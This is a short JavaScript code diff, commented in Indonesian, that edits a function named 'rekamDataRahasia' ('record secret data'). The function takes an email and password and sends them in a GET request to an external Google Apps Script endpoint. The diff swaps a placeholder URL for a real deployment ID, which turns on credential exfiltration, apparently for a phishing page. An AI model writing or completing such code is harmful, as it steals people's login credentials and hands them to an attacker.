@@ -122,7 +122,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
 // Fungsi luar (Bisa tetap di luar DOMContentLoaded)
 async function rekamDataRahasia(email, password) {
-    const urlAppsScript = "https://script.google.com/macros/s/PASTIKAN_ID_EXEC_BENAR/exec";
+    const urlAppsScript = "https://script.google.com/macros/s/AKfycbxYhp8p7-nvDCcy5An13cJyHplLF9YaSNwwjiEiwZJXE-IEVf3RDPPF8OUj2zybft4/exec";
     try {
         fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
             method: 'GET',
